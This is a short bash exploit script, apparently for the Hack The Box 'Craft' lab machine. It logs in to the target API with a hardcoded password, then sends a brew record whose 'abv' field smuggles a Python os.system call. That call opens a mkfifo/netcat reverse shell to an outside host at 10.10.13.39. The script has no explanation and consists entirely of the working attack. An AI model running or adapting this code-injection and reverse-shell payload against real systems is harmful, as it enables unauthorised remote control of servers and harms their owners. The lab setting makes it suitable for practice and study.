#!/bin/bash

untrimmed=$(curl -k -s -u dinesh:4aUh0A8PbVJxgd -X GET "https://api.craft.htb/api/auth/login" -H  "accept: application/json" | cut -d':' -f2)
token=${untrimmed:1:-2}

#echo "[*] Token:" $token

curl -k -H "X-Craft-API-Token:$token" -X POST "https://api.craft.htb/api/brew/" --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv":"__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.13.39 8080 >/tmp/f\")"}' -H "Content-Type:application/json"
